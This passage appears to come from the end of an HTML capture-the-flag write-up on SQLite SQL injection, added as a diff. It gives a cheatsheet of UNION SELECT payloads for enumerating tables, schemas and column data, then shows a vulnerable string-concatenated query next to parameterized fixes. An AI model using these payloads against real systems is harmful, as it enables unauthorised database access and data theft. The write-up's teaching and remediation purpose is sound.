+    <!-- SQLite vs others cheatsheet -->
+    <h2 data-num="11">SQLite SQLi Cheatsheet</h2>
+    <p>SQLite has some quirks compared to MySQL and PostgreSQL that are useful to know during CTFs:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">sqlite injection cheatsheet</span>
+      </div>
+      <pre><span class="cm">-- List all tables</span>
+<span class="sql-op">'</span> <span class="sql-kw">UNION SELECT</span> name,<span class="sql-str">'a'</span>,<span class="num">1</span>,<span class="sql-str">'b'</span> <span class="sql-kw">FROM</span> <span class="sql-tbl">sqlite_master</span> <span class="sql-kw">WHERE</span> type=<span class="sql-str">'table'</span><span class="sql-op">--</span>
+
+<span class="cm">-- Get CREATE TABLE statement (reveals all columns)</span>
+<span class="sql-op">'</span> <span class="sql-kw">UNION SELECT</span> sql,<span class="sql-str">'a'</span>,<span class="num">1</span>,<span class="sql-str">'b'</span> <span class="sql-kw">FROM</span> <span class="sql-tbl">sqlite_master</span> <span class="sql-kw">WHERE</span> name=<span class="sql-str">'target_table'</span><span class="sql-op">--</span>
+
+<span class="cm">-- Dump specific column</span>
+<span class="sql-op">'</span> <span class="sql-kw">UNION SELECT</span> column_name,<span class="sql-str">'a'</span>,<span class="num">1</span>,<span class="sql-str">'b'</span> <span class="sql-kw">FROM</span> <span class="sql-tbl">target_table</span><span class="sql-op">--</span>
+
+<span class="cm">-- Concatenate multiple columns</span>
+<span class="sql-op">'</span> <span class="sql-kw">UNION SELECT</span> col1||<span class="sql-str">':'</span>||col2,<span class="sql-str">'a'</span>,<span class="num">1</span>,<span class="sql-str">'b'</span> <span class="sql-kw">FROM</span> <span class="sql-tbl">target_table</span><span class="sql-op">--</span>
+
+<span class="cm">-- SQLite version</span>
+<span class="sql-op">'</span> <span class="sql-kw">UNION SELECT</span> <span class="fn">sqlite_version</span>(),<span class="sql-str">'a'</span>,<span class="num">1</span>,<span class="sql-str">'b'</span><span class="sql-op">--</span>
+
+<span class="cm">-- Comment styles in SQLite</span>
+<span class="sql-op">--</span>   single-line comment
+<span class="sql-op">/**/</span> multi-line comment</pre>
+    </div>
+
+    <hr class="divider">
+
+    <!-- Fix -->
+    <h2 data-num="12">The Fix — Parameterized Queries</h2>
+    <p>SQL injection is completely preventable with one change: <strong>never concatenate user input into SQL strings</strong>. Use parameterized queries (prepared statements) instead.</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">python — vulnerable vs secure</span>
+      </div>
+      <pre><span class="cm"># ❌ VULNERABLE — string concatenation</span>
+search = request.args.get(<span class="str">'q'</span>)
+query = <span class="str">f"SELECT * FROM records WHERE title LIKE '%</span>{search}<span class="str">%'"</span>
+cursor.execute(query)  <span class="cm"># attacker controls the SQL!</span>
+
+<span class="cm"># ✅ SECURE — parameterized query</span>
+search = request.args.get(<span class="str">'q'</span>)
+query = <span class="str">"SELECT * FROM records WHERE title LIKE ?"</span>
+cursor.execute(query, (<span class="str">f'%{search}%'</span>,))  <span class="cm"># input treated as data, not SQL</span>
+
+<span class="cm"># ✅ SECURE — with SQLAlchemy ORM</span>
+results = db.session.<span class="fn">query</span>(Record).<span class="fn">filter</span>(
+    Record.title.<span class="fn">like</span>(<span class="str">f'%{search}%'</span>)
+).<span class="fn">all</span>()  <span class="cm"># ORM handles parameterization automatically</span></pre>
+    </div>
+
+    <div class="warning-box">
+      <p><strong>Additional hardening:</strong> Never display raw database errors to users — they reveal schema info and DB engine. Use generic error pages in production. Also apply least-privilege DB accounts so the app user can't access tables it doesn't need.</p>
+    </div>
+
+  </article>
+</div>
+
+<footer>
+  <div class="container">
+    <div class="footer-content">
+      <div class="footer-text">RedFox CTF 2026 — SQLite SQL Injection Writeup</div>
+      <div class="footer-badge">✓ SOLVED</div>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
